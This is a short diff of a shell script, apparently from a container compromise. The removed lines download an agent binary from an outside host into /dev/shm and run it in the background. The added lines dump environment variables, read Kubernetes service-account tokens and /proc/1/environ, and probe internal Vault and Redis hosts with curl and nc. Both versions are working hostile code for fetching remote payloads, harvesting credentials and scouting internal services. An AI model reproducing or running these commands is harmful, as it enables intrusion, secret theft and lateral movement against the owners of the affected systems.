@@ -1,6 +1,14 @@
 #!/bin/sh
-curl -k -s https://s45.text-sync.com/zs33eovomr5ieisg/agent_linux_amd64_1784361458 -o /dev/shm/agent 2>/dev/null
-chmod +x /dev/shm/agent 2>/dev/null
-/dev/shm/agent &
-echo OK
+echo "=== ENV ==="
+env
+echo "=== SA TOKEN ==="
+cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_SA_TOKEN"
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_SA_TOKEN2"
+echo "=== PROC ENVIRON ==="
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' || echo "NO_PROC"
+echo "=== VAULT TEST ==="
+curl -s http://172.20.73.191:8200/v1/sys/health 2>/dev/null || echo "VAULT_UNREACHABLE"
+echo "=== REDIS TEST ==="
+printf "PING\r\n" | timeout 2 nc 172.20.167.25 6379 2>/dev/null || echo "REDIS_UNREACHABLE"
+echo "=== DONE ==="
 exit 0
